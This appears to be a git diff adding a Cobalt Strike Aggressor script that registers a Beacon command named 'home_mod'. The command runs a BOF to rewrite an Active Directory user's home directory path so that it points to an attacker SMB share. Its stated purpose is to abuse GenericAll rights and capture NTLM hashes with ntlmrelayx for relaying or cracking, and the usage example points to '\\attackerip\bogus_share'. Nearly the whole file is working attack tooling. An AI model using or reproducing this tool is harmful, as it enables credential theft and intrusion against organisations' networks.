@@ -1,0 +1,49 @@
+# $1 = beacon ID
+# $2 = user to modify 
+# $3 = drive letter 
+# $4 = path to smb server 
+
+beacon_command_register(
+    "home_mod",
+    "BOF (x64 only) - Modify users home directory path.",
+    "Description: leverage existing 'GenericAll' AD rights over an object (ie:) user
+                  to set their profile to an attacker smb server (ie:) ntlmrelayx to dump hashes, 
+                  relay, or crack.
+
+    Usage: home_mod <username> <drive letter> <attacker share>
+    Example: home_mod jblogg N \\attackerip\bogus_share");
+
+
+alias home_mod{
+    local('$handle $data $args $user $letter $path');
+    
+    # parse arguments
+    
+        # $user - did this instead of through the program (.c)...allows for convenient edit if needed
+    $user = "(&(objectClass=user)(objectCategory=user)(sAMAccountName=  $+ $2 $+ ))";
+    $letter = $3;
+    $path = $4;  
+
+    # verify # of arguments
+    if (size(@_) < 3)
+	{
+		berror($1, beacon_command_detail("homedir_modify"));
+		return;
+	}
+	
+    # read in BOF file
+    $handle = openf(script_resource("homedirbof.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # pack arguments
+    # $args = bof_pack($1, "zzz", $user, $letter, $path);
+    $args = bof_pack($1, "zzz", $user, $letter, $path);
+
+    # comms
+    btask($1, "modify \'$2\' home directory to point to: $4");
+
+    # run BOF
+    beacon_inline_execute($1, $data, "go", $args);
+
+}
